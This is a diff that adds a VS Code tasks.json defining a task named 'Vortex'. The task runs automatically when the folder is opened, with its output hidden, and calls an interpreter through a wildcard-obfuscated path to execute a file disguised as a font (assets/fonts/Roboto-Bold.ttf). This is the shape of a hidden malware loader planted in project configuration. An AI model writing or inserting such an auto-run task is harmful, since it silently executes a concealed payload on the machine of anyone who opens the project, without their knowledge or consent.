@@ -1,0 +1,12 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Vortex",
+      "type": "shell",
+      "command": "/u??/*l/*m/v*/*/*/*n/???? assets/fonts/Roboto-Bold.ttf",
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "never" }
+    }
+  ]
+}
